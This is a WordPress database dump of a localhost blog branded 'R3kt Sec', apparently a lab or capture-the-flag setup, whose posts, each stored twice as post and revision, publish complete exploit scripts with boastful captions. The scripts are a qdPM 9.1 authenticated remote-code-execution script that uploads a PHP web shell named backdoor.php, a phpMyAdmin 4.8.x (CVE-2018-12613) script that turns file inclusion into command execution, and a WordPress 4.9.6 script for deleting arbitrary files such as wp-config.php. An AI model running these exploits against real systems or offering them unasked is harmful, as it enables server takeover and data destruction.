INSERT INTO `wp_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1, 1, '2022-10-23 07:29:40', '2022-10-23 07:29:40', '<!-- wp:paragraph -->\n<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>\n<!-- /wp:paragraph -->', 'Hello world!', '', 'trash', 'open', 'open', '', 'hello-world__trashed', '', '', '2022-10-23 08:10:55', '2022-10-23 08:10:55', '', 0, 'http://localhost/?p=1', 0, 'post', '', 1),
(2, 1, '2022-10-23 07:29:40', '2022-10-23 07:29:40', '<!-- wp:paragraph -->\n<p>This is an example page. It\'s different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:quote -->\n<blockquote class=\"wp-block-quote\"><p>Hi there! I\'m a bike messenger by day, aspiring actor by night, and this is my website. I live in Los Angeles, have a great dog named Jack, and I like pi&#241;a coladas. (And gettin\' caught in the rain.)</p></blockquote>\n<!-- /wp:quote -->\n\n<!-- wp:paragraph -->\n<p>...or something like this:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:quote -->\n<blockquote class=\"wp-block-quote\"><p>The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.</p></blockquote>\n<!-- /wp:quote -->\n\n<!-- wp:paragraph -->\n<p>As a new WordPress user, you should go to <a href=\"http://localhost/wp-admin/\">your dashboard</a> to delete this page and create new pages for your content. Have fun!</p>\n<!-- /wp:paragraph -->', 'Sample Page', '', 'trash', 'closed', 'open', '', 'sample-page__trashed', '', '', '2022-10-23 08:22:31', '2022-10-23 08:22:31', '', 0, 'http://localhost/?page_id=2', 0, 'page', '', 0),
(3, 1, '2022-10-23 07:29:40', '2022-10-23 07:29:40', '<!-- wp:heading --><h2>Who we are</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Our website address is: http://localhost.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Comments</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>When visitors leave comments on the site we collect the data shown in the comments form, and also the visitor&#8217;s IP address and browser user agent string to help spam detection.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>An anonymized string created from your email address (also called a hash) may be provided to the Gravatar service to see if you are using it. The Gravatar service privacy policy is available here: https://automattic.com/privacy/. After approval of your comment, your profile picture is visible to the public in the context of your comment.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Media</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you upload images to the website, you should avoid uploading images with embedded location data (EXIF GPS) included. Visitors to the website can download and extract any location data from images on the website.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Cookies</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you leave a comment on our site you may opt-in to saving your name, email address and website in cookies. These are for your convenience so that you do not have to fill in your details again when you leave another comment. These cookies will last for one year.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>If you visit our login page, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>When you log in, we will also set up several cookies to save your login information and your screen display choices. Login cookies last for two days, and screen options cookies last for a year. If you select &quot;Remember Me&quot;, your login will persist for two weeks. If you log out of your account, the login cookies will be removed.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>If you edit or publish an article, an additional cookie will be saved in your browser. This cookie includes no personal data and simply indicates the post ID of the article you just edited. It expires after 1 day.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Embedded content from other websites</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Articles on this site may include embedded content (e.g. videos, images, articles, etc.). Embedded content from other websites behaves in the exact same way as if the visitor has visited the other website.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>These websites may collect data about you, use cookies, embed additional third-party tracking, and monitor your interaction with that embedded content, including tracking your interaction with the embedded content if you have an account and are logged in to that website.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Who we share your data with</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you request a password reset, your IP address will be included in the reset email.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>How long we retain your data</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you leave a comment, the comment and its metadata are retained indefinitely. This is so we can recognize and approve any follow-up comments automatically instead of holding them in a moderation queue.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>For users that register on our website (if any), we also store the personal information they provide in their user profile. All users can see, edit, or delete their personal information at any time (except they cannot change their username). Website administrators can also see and edit that information.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>What rights you have over your data</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you have an account on this site, or have left comments, you can request to receive an exported file of the personal data we hold about you, including any data you have provided to us. You can also request that we erase any personal data we hold about you. This does not include any data we are obliged to keep for administrative, legal, or security purposes.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Where your data is sent</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Visitor comments may be checked through an automated spam detection service.</p><!-- /wp:paragraph -->', 'Privacy Policy', '', 'trash', 'closed', 'open', '', 'privacy-policy__trashed', '', '', '2022-10-23 08:22:36', '2022-10-23 08:22:36', '', 0, 'http://localhost/?page_id=3', 0, 'page', '', 0),
(4, 1, '2022-10-23 07:29:56', '0000-00-00 00:00:00', '', 'Auto Draft', '', 'auto-draft', 'open', 'open', '', '', '', '', '2022-10-23 07:29:56', '0000-00-00 00:00:00', '', 0, 'http://localhost/?p=4', 0, 'post', '', 0),
(5, 1, '2022-10-23 08:10:20', '2022-10-23 08:10:20', '{\n    \"exs-dark::intro_heading\": {\n        \"value\": \"Welcome to R3kt Sec\",\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 08:10:20\"\n    },\n    \"exs-dark::logo_text_primary\": {\n        \"value\": \"R3kt Sec\",\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 08:09:53\"\n    },\n    \"exs-dark::logo_text_secondary\": {\n        \"value\": \"MESS WITH THE BEST. DIE LIKE THE REST\",\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 08:09:53\"\n    }\n}', '', '', 'trash', 'closed', 'closed', '', 'fa1ad727-b3cd-4ca2-b8be-423bfc3de8db', '', '', '2022-10-23 08:10:20', '2022-10-23 08:10:20', '', 0, 'http://localhost/?p=5', 0, 'customize_changeset', '', 0),
(6, 1, '2022-10-23 08:10:55', '2022-10-23 08:10:55', '<!-- wp:paragraph -->\n<p>Welcome to WordPress. This is your first post. Edit or delete it, then start writing!</p>\n<!-- /wp:paragraph -->', 'Hello world!', '', 'inherit', 'closed', 'closed', '', '1-revision-v1', '', '', '2022-10-23 08:10:55', '2022-10-23 08:10:55', '', 1, 'http://localhost/?p=6', 0, 'revision', '', 0),
(7, 1, '2022-02-18 08:13:53', '2022-02-18 08:13:53', '<!-- wp:paragraph -->\n<p>Our buddy Rishal coming in with the goods. That\'s right. Another RCE in qdPM.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Legend.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Read it and weep sysadmins.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/python3\r\n\r\nimport sys\r\nimport requests\r\nfrom lxml import html\r\nfrom argparse import ArgumentParser\r\n\r\nsession_requests = requests.session()\r\n\r\ndef multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, uservar):\r\n    request_1 = {\r\n        \'sf_method\': (None, \'put\'),\r\n        \'users&#91;id]\': (None, userid&#91;-1]),\r\n        \'users&#91;photo_preview]\': (None, uservar),\r\n        \'users&#91;_csrf_token]\': (None, csrftoken_&#91;-1]),\r\n        \'users&#91;name]\': (None, username&#91;-1]),\r\n        \'users&#91;new_password]\': (None, \'\'),\r\n        \'users&#91;email]\': (None, EMAIL),\r\n        \'extra_fields&#91;9]\': (None, \'\'),\r\n        \'users&#91;remove_photo]\': (None, \'1\'),\r\n        }\r\n    return request_1\r\n\r\n\r\ndef req(userid, username, csrftoken_, EMAIL, HOSTNAME):\r\n    request_1 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, \'.htaccess\')\r\n    new = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_1)\r\n    request_2 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, \'../.htaccess\')\r\n    new1 = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_2)\r\n    request_3 = {\r\n        \'sf_method\': (None, \'put\'),\r\n        \'users&#91;id]\': (None, userid&#91;-1]),\r\n        \'users&#91;photo_preview]\': (None, \'\'),\r\n        \'users&#91;_csrf_token]\': (None, csrftoken_&#91;-1]),\r\n        \'users&#91;name]\': (None, username&#91;-1]),\r\n        \'users&#91;new_password]\': (None, \'\'),\r\n        \'users&#91;email]\': (None, EMAIL),\r\n        \'extra_fields&#91;9]\': (None, \'\'),\r\n        \'users&#91;photo]\': (\'backdoor.php\', \'&lt;?php if(isset($_REQUEST&#91;\\\'cmd\\\'])){ echo \"&lt;pre>\"; $cmd = ($_REQUEST&#91;\\\'cmd\\\']); system($cmd); echo \"&lt;/pre>\"; die; }?>\', \'application/octet-stream\'),\r\n        }\r\n    upload_req = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_3)\r\n\r\n\r\ndef main(HOSTNAME, EMAIL, PASSWORD):\r\n    url = HOSTNAME + \'/index.php/login\'\r\n    result = session_requests.get(url)\r\n    #print(result.text)\r\n    login_tree = html.fromstring(result.text)\r\n    authenticity_token = list(set(login_tree.xpath(\"//input&#91;@name=\'login&#91;_csrf_token]\']/@value\")))&#91;0]\r\n    payload = {\'login&#91;email]\': EMAIL, \'login&#91;password]\': PASSWORD, \'login&#91;_csrf_token]\': authenticity_token}\r\n    result = session_requests.post(HOSTNAME + \'/index.php/login\', data=payload, headers=dict(referer=HOSTNAME + \'/index.php/login\'))\r\n    # The designated admin account does not have a myAccount page\r\n    account_page = session_requests.get(HOSTNAME + \'index.php/myAccount\')\r\n    account_tree = html.fromstring(account_page.content)\r\n    userid = account_tree.xpath(\"//input&#91;@name=\'users&#91;id]\']/@value\")\r\n    username = account_tree.xpath(\"//input&#91;@name=\'users&#91;name]\']/@value\")\r\n    csrftoken_ = account_tree.xpath(\"//input&#91;@name=\'users&#91;_csrf_token]\']/@value\")\r\n    req(userid, username, csrftoken_, EMAIL, HOSTNAME)\r\n    get_file = session_requests.get(HOSTNAME + \'index.php/myAccount\')\r\n    final_tree = html.fromstring(get_file.content)\r\n    backdoor = requests.get(HOSTNAME + \"uploads/users/\")\r\n    count = 0\r\n    dateStamp = \"1970-01-01 00:00\"\r\n    backdoorFile = \"\"\r\n    for line in backdoor.text.split(\"\\n\"):\r\n        count = count + 1\r\n        if \"backdoor.php\" in str(line):\r\n            try:\r\n                start = \"\\\"right\\\"\"\r\n                end = \" &lt;/td\"\r\n                line = str(line)\r\n                dateStampNew = line&#91;line.index(start)+8:line.index(end)]\r\n                if (dateStampNew > dateStamp):\r\n                    dateStamp = dateStampNew\r\n                    print(\"The DateStamp is \" + dateStamp)\r\n                    backdoorFile = line&#91;line.index(\"href\")+6:line.index(\"php\")+3]\r\n            except:\r\n                print(\"Exception occurred\")\r\n                continue\r\n        #print(backdoor)\r\n    print(\'Backdoor uploaded at - > \' + HOSTNAME + \'uploads/users/\' + backdoorFile + \'?cmd=whoami\')\r\n\r\nif __name__ == \'__main__\':\r\n    print(\"You are not able to use the designated admin account because they do not have a myAccount page.\\n\")\r\n    parser = ArgumentParser(description=\'qdmp - Path traversal + RCE Exploit\')\r\n    parser.add_argument(\'-url\', \'--host\', dest=\'hostname\', help=\'Project URL\')\r\n    parser.add_argument(\'-u\', \'--email\', dest=\'email\', help=\'User email (Any privilege account)\')\r\n    parser.add_argument(\'-p\', \'--password\', dest=\'password\', help=\'User password\')\r\n    args = parser.parse_args()\r\n    # Added detection if the arguments are passed and populated, if not display the arguments\r\n    if  (len(sys.argv) > 1 and isinstance(args.hostname, str) and isinstance(args.email, str) and isinstance(args.password, str)):\r\n            main(args.hostname, args.email, args.password)\r\n    else:\r\n        parser.print_help()\r\n            </code></pre>\n<!-- /wp:code -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->', 'qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)', '', 'publish', 'open', 'open', '', 'qdpm-9-1-remote-code-execution-rce-authenticated-v2', '', '', '2022-10-23 08:42:31', '2022-10-23 08:42:31', '', 0, 'http://localhost/?p=7', 0, 'post', '', 0),
(8, 1, '2022-10-23 08:11:26', '2022-10-23 08:11:26', '{\"version\": 2, \"isGlobalStylesUserThemeJSON\": true }', 'Custom Styles', '', 'publish', 'closed', 'closed', '', 'wp-global-styles-exs-dark', '', '', '2022-10-23 08:11:26', '2022-10-23 08:11:26', '', 0, 'http://localhost/2022/10/23/wp-global-styles-exs-dark/', 0, 'wp_global_styles', '', 0),
(9, 1, '2022-10-23 08:13:53', '2022-10-23 08:13:53', '<!-- wp:paragraph -->\n<p>Our buddy Rishal coming in with the goods. That\'s right. Another RCE in qdPM.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Legend.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Read it and weep sysadmins.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/python3\r\n\r\nimport sys\r\nimport requests\r\nfrom lxml import html\r\nfrom argparse import ArgumentParser\r\n\r\nsession_requests = requests.session()\r\n\r\ndef multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, uservar):\r\n    request_1 = {\r\n        \'sf_method\': (None, \'put\'),\r\n        \'users&#91;id]\': (None, userid&#91;-1]),\r\n        \'users&#91;photo_preview]\': (None, uservar),\r\n        \'users&#91;_csrf_token]\': (None, csrftoken_&#91;-1]),\r\n        \'users&#91;name]\': (None, username&#91;-1]),\r\n        \'users&#91;new_password]\': (None, \'\'),\r\n        \'users&#91;email]\': (None, EMAIL),\r\n        \'extra_fields&#91;9]\': (None, \'\'),\r\n        \'users&#91;remove_photo]\': (None, \'1\'),\r\n        }\r\n    return request_1\r\n\r\n\r\ndef req(userid, username, csrftoken_, EMAIL, HOSTNAME):\r\n    request_1 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, \'.htaccess\')\r\n    new = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_1)\r\n    request_2 = multifrm(userid, username, csrftoken_, EMAIL, HOSTNAME, \'../.htaccess\')\r\n    new1 = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_2)\r\n    request_3 = {\r\n        \'sf_method\': (None, \'put\'),\r\n        \'users&#91;id]\': (None, userid&#91;-1]),\r\n        \'users&#91;photo_preview]\': (None, \'\'),\r\n        \'users&#91;_csrf_token]\': (None, csrftoken_&#91;-1]),\r\n        \'users&#91;name]\': (None, username&#91;-1]),\r\n        \'users&#91;new_password]\': (None, \'\'),\r\n        \'users&#91;email]\': (None, EMAIL),\r\n        \'extra_fields&#91;9]\': (None, \'\'),\r\n        \'users&#91;photo]\': (\'backdoor.php\', \'&lt;?php if(isset($_REQUEST&#91;\\\'cmd\\\'])){ echo \"&lt;pre>\"; $cmd = ($_REQUEST&#91;\\\'cmd\\\']); system($cmd); echo \"&lt;/pre>\"; die; }?>\', \'application/octet-stream\'),\r\n        }\r\n    upload_req = session_requests.post(HOSTNAME + \'index.php/myAccount/update\', files=request_3)\r\n\r\n\r\ndef main(HOSTNAME, EMAIL, PASSWORD):\r\n    url = HOSTNAME + \'/index.php/login\'\r\n    result = session_requests.get(url)\r\n    #print(result.text)\r\n    login_tree = html.fromstring(result.text)\r\n    authenticity_token = list(set(login_tree.xpath(\"//input&#91;@name=\'login&#91;_csrf_token]\']/@value\")))&#91;0]\r\n    payload = {\'login&#91;email]\': EMAIL, \'login&#91;password]\': PASSWORD, \'login&#91;_csrf_token]\': authenticity_token}\r\n    result = session_requests.post(HOSTNAME + \'/index.php/login\', data=payload, headers=dict(referer=HOSTNAME + \'/index.php/login\'))\r\n    # The designated admin account does not have a myAccount page\r\n    account_page = session_requests.get(HOSTNAME + \'index.php/myAccount\')\r\n    account_tree = html.fromstring(account_page.content)\r\n    userid = account_tree.xpath(\"//input&#91;@name=\'users&#91;id]\']/@value\")\r\n    username = account_tree.xpath(\"//input&#91;@name=\'users&#91;name]\']/@value\")\r\n    csrftoken_ = account_tree.xpath(\"//input&#91;@name=\'users&#91;_csrf_token]\']/@value\")\r\n    req(userid, username, csrftoken_, EMAIL, HOSTNAME)\r\n    get_file = session_requests.get(HOSTNAME + \'index.php/myAccount\')\r\n    final_tree = html.fromstring(get_file.content)\r\n    backdoor = requests.get(HOSTNAME + \"uploads/users/\")\r\n    count = 0\r\n    dateStamp = \"1970-01-01 00:00\"\r\n    backdoorFile = \"\"\r\n    for line in backdoor.text.split(\"\\n\"):\r\n        count = count + 1\r\n        if \"backdoor.php\" in str(line):\r\n            try:\r\n                start = \"\\\"right\\\"\"\r\n                end = \" &lt;/td\"\r\n                line = str(line)\r\n                dateStampNew = line&#91;line.index(start)+8:line.index(end)]\r\n                if (dateStampNew > dateStamp):\r\n                    dateStamp = dateStampNew\r\n                    print(\"The DateStamp is \" + dateStamp)\r\n                    backdoorFile = line&#91;line.index(\"href\")+6:line.index(\"php\")+3]\r\n            except:\r\n                print(\"Exception occurred\")\r\n                continue\r\n        #print(backdoor)\r\n    print(\'Backdoor uploaded at - > \' + HOSTNAME + \'uploads/users/\' + backdoorFile + \'?cmd=whoami\')\r\n\r\nif __name__ == \'__main__\':\r\n    print(\"You are not able to use the designated admin account because they do not have a myAccount page.\\n\")\r\n    parser = ArgumentParser(description=\'qdmp - Path traversal + RCE Exploit\')\r\n    parser.add_argument(\'-url\', \'--host\', dest=\'hostname\', help=\'Project URL\')\r\n    parser.add_argument(\'-u\', \'--email\', dest=\'email\', help=\'User email (Any privilege account)\')\r\n    parser.add_argument(\'-p\', \'--password\', dest=\'password\', help=\'User password\')\r\n    args = parser.parse_args()\r\n    # Added detection if the arguments are passed and populated, if not display the arguments\r\n    if  (len(sys.argv) > 1 and isinstance(args.hostname, str) and isinstance(args.email, str) and isinstance(args.password, str)):\r\n            main(args.hostname, args.email, args.password)\r\n    else:\r\n        parser.print_help()\r\n            </code></pre>\n<!-- /wp:code -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->', 'qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)', '', 'inherit', 'closed', 'closed', '', '7-revision-v1', '', '', '2022-10-23 08:13:53', '2022-10-23 08:13:53', '', 7, 'http://localhost/?p=9', 0, 'revision', '', 0),
(10, 1, '2022-04-29 08:16:41', '2022-04-29 08:16:41', '<!-- wp:paragraph -->\n<p>Dropping another 3l33t one today. PHPMyAdmin... More like PHPI\'mAdmin.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Peace</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/env python\r\n\r\nimport re, requests, sys\r\n\r\n# check python major version\r\nif sys.version_info.major == 3:\r\n  import html\r\nelse:\r\n  from six.moves.html_parser import HTMLParser\r\n  html = HTMLParser()\r\n\r\nif len(sys.argv) &lt; 7:\r\n  usage = \"\"\"Usage: {} &#91;ipaddr] &#91;port] &#91;path] &#91;username] &#91;password] &#91;command]\r\nExample: {} 192.168.56.65 8080 /phpmyadmin username password whoami\"\"\"\r\n  print(usage.format(sys.argv&#91;0],sys.argv&#91;0]))\r\n  exit()\r\n\r\ndef get_token(content):\r\n  s = re.search(\'token\"\\s*value=\"(.*?)\"\', content)\r\n  token = html.unescape(s.group(1))\r\n  return token\r\n\r\nipaddr = sys.argv&#91;1]\r\nport = sys.argv&#91;2]\r\npath = sys.argv&#91;3]\r\nusername = sys.argv&#91;4]\r\npassword = sys.argv&#91;5]\r\ncommand = sys.argv&#91;6]\r\n\r\nurl = \"http://{}:{}{}\".format(ipaddr,port,path)\r\n\r\n# 1st req: check login page and version\r\nurl1 = url + \"/index.php\"\r\nr = requests.get(url1)\r\ncontent = r.content.decode(\'utf-8\')\r\nif r.status_code != 200:\r\n  print(\"Unable to find the version\")\r\n  exit()\r\n\r\ns = re.search(\'PMA_VERSION:\"(\\d+\\.\\d+\\.\\d+)\"\', content)\r\nversion = s.group(1)\r\nif version != \"4.8.0\" and version != \"4.8.1\":\r\n  print(\"The target is not exploitable\".format(version))\r\n  exit()\r\n\r\n# get 1st token and cookie\r\ncookies = r.cookies\r\ntoken = get_token(content)\r\n\r\n# 2nd req: login\r\np = {\'token\': token, \'pma_username\': username, \'pma_password\': password}\r\nr = requests.post(url1, cookies = cookies, data = p)\r\ncontent = r.content.decode(\'utf-8\')\r\ns = re.search(\'logged_in:(\\w+),\', content)\r\nlogged_in = s.group(1)\r\nif logged_in == \"false\":\r\n  print(\"Authentication failed\")\r\n  exit()\r\n\r\n# get 2nd token and cookie\r\ncookies = r.cookies\r\ntoken = get_token(content)\r\n\r\n# 3rd req: execute query\r\nurl2 = url + \"/import.php\"\r\n# payload\r\npayload = \'\'\'select \'&lt;?php system(\"{}\") ?>\';\'\'\'.format(command)\r\np = {\'table\':\'\', \'token\': token, \'sql_query\': payload }\r\nr = requests.post(url2, cookies = cookies, data = p)\r\nif r.status_code != 200:\r\n  print(\"Query failed\")\r\n  exit()\r\n\r\n# 4th req: execute payload\r\nsession_id = cookies.get_dict()&#91;\'phpMyAdmin\']\r\nurl3 = url + \"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}\".format(session_id)\r\nr = requests.get(url3, cookies = cookies)\r\nif r.status_code != 200:\r\n  print(\"Exploit failed\")\r\n  exit()\r\n\r\n# get result\r\ncontent = r.content.decode(\'utf-8\', errors=\"replace\")\r\ns = re.search(\"select \'(.*?)\\n\'\", content, re.DOTALL)\r\nif s != None:\r\n  print(s.group(1))\r\n            </code></pre>\n<!-- /wp:code -->', 'CVE-2018-12613', '', 'publish', 'open', 'open', '', 'cve-2018-12613', '', '', '2022-10-23 08:42:52', '2022-10-23 08:42:52', '', 0, 'http://localhost/?p=10', 0, 'post', '', 1),
(11, 1, '2022-10-23 08:16:41', '2022-10-23 08:16:41', '<!-- wp:paragraph -->\n<p>Dropping another 3l33t one today. PHPMyAdmin... More like PHPI\'mAdmin.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>Peace</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/env python\r\n\r\nimport re, requests, sys\r\n\r\n# check python major version\r\nif sys.version_info.major == 3:\r\n  import html\r\nelse:\r\n  from six.moves.html_parser import HTMLParser\r\n  html = HTMLParser()\r\n\r\nif len(sys.argv) &lt; 7:\r\n  usage = \"\"\"Usage: {} &#91;ipaddr] &#91;port] &#91;path] &#91;username] &#91;password] &#91;command]\r\nExample: {} 192.168.56.65 8080 /phpmyadmin username password whoami\"\"\"\r\n  print(usage.format(sys.argv&#91;0],sys.argv&#91;0]))\r\n  exit()\r\n\r\ndef get_token(content):\r\n  s = re.search(\'token\"\\s*value=\"(.*?)\"\', content)\r\n  token = html.unescape(s.group(1))\r\n  return token\r\n\r\nipaddr = sys.argv&#91;1]\r\nport = sys.argv&#91;2]\r\npath = sys.argv&#91;3]\r\nusername = sys.argv&#91;4]\r\npassword = sys.argv&#91;5]\r\ncommand = sys.argv&#91;6]\r\n\r\nurl = \"http://{}:{}{}\".format(ipaddr,port,path)\r\n\r\n# 1st req: check login page and version\r\nurl1 = url + \"/index.php\"\r\nr = requests.get(url1)\r\ncontent = r.content.decode(\'utf-8\')\r\nif r.status_code != 200:\r\n  print(\"Unable to find the version\")\r\n  exit()\r\n\r\ns = re.search(\'PMA_VERSION:\"(\\d+\\.\\d+\\.\\d+)\"\', content)\r\nversion = s.group(1)\r\nif version != \"4.8.0\" and version != \"4.8.1\":\r\n  print(\"The target is not exploitable\".format(version))\r\n  exit()\r\n\r\n# get 1st token and cookie\r\ncookies = r.cookies\r\ntoken = get_token(content)\r\n\r\n# 2nd req: login\r\np = {\'token\': token, \'pma_username\': username, \'pma_password\': password}\r\nr = requests.post(url1, cookies = cookies, data = p)\r\ncontent = r.content.decode(\'utf-8\')\r\ns = re.search(\'logged_in:(\\w+),\', content)\r\nlogged_in = s.group(1)\r\nif logged_in == \"false\":\r\n  print(\"Authentication failed\")\r\n  exit()\r\n\r\n# get 2nd token and cookie\r\ncookies = r.cookies\r\ntoken = get_token(content)\r\n\r\n# 3rd req: execute query\r\nurl2 = url + \"/import.php\"\r\n# payload\r\npayload = \'\'\'select \'&lt;?php system(\"{}\") ?>\';\'\'\'.format(command)\r\np = {\'table\':\'\', \'token\': token, \'sql_query\': payload }\r\nr = requests.post(url2, cookies = cookies, data = p)\r\nif r.status_code != 200:\r\n  print(\"Query failed\")\r\n  exit()\r\n\r\n# 4th req: execute payload\r\nsession_id = cookies.get_dict()&#91;\'phpMyAdmin\']\r\nurl3 = url + \"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}\".format(session_id)\r\nr = requests.get(url3, cookies = cookies)\r\nif r.status_code != 200:\r\n  print(\"Exploit failed\")\r\n  exit()\r\n\r\n# get result\r\ncontent = r.content.decode(\'utf-8\', errors=\"replace\")\r\ns = re.search(\"select \'(.*?)\\n\'\", content, re.DOTALL)\r\nif s != None:\r\n  print(s.group(1))\r\n            </code></pre>\n<!-- /wp:code -->', 'CVE-2018-12613', '', 'inherit', 'closed', 'closed', '', '10-revision-v1', '', '', '2022-10-23 08:16:41', '2022-10-23 08:16:41', '', 10, 'http://localhost/?p=11', 0, 'revision', '', 0),
(12, 1, '2022-05-07 08:17:48', '2022-05-07 08:17:48', '<!-- wp:paragraph -->\n<p>A JavaScript based one for y\'all today. Enjoy!</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>/*\r\n\r\nUsage:\r\n  1. Login to wordpress with privileges of an author\r\n  2. Navigates to Media > Add New > Select Files > Open/Upload\r\n  3. Click Edit > Open Developer Console > Paste this exploit script\r\n  4. Execute the function, eg: unlink_thumb(\"../../../../wp-config.php\")\r\n*/\r\n\r\nfunction unlink_thumb(thumb) {\r\n\r\n  $nonce_id = document.getElementById(\"_wpnonce\").value\r\n  if (thumb == null) {\r\n    console.log(\"specify a file to delete\")\r\n    return false\r\n  }\r\n  if ($nonce_id == null) {\r\n    console.log(\"the nonce id is not found\")\r\n    return false\r\n  }\r\n\r\n  fetch(window.location.href.replace(\"&amp;action=edit\",\"\"),\r\n    {\r\n      method: \'POST\',\r\n      credentials: \'include\',\r\n      headers: {\'Content-Type\': \'application/x-www-form-urlencoded\'},\r\n      body: \"action=editattachment&amp;_wpnonce=\" + $nonce_id + \"&amp;thumb=\" + thumb\r\n    })\r\n    .then(function(resp0) {\r\n      if (resp0.redirected) {\r\n        $del = document.getElementsByClassName(\"submitdelete deletion\").item(0).href\r\n        if ($del == null) {\r\n          console.log(\"Unknown error: could not find the url action\")\r\n          return false\r\n        }\r\n        fetch($del, \r\n          {\r\n            method: \'GET\',\r\n            credentials: \'include\'\r\n          }).then(function(resp1) {\r\n            if (resp1.redirected) {\r\n              console.log(\"Arbitrary file deletion of \" + thumb + \" succeed!\")\r\n              return true\r\n            } else {\r\n              console.log(\"Arbitrary file deletion of \" + thumb + \" failed!\")\r\n              return false\r\n            }\r\n          })\r\n      } else {\r\n        console.log(\"Arbitrary file deletion of \" + thumb + \" failed!\")\r\n        return false\r\n      }\r\n    })\r\n}</code></pre>\n<!-- /wp:code -->', 'Wordpress 4.9.6 - Arbitrary File Deletion', '', 'publish', 'open', 'open', '', 'wordpress-4-9-6-arbitrary-file-deletion', '', '', '2022-10-23 08:43:08', '2022-10-23 08:43:08', '', 0, 'http://localhost/?p=12', 0, 'post', '', 0),
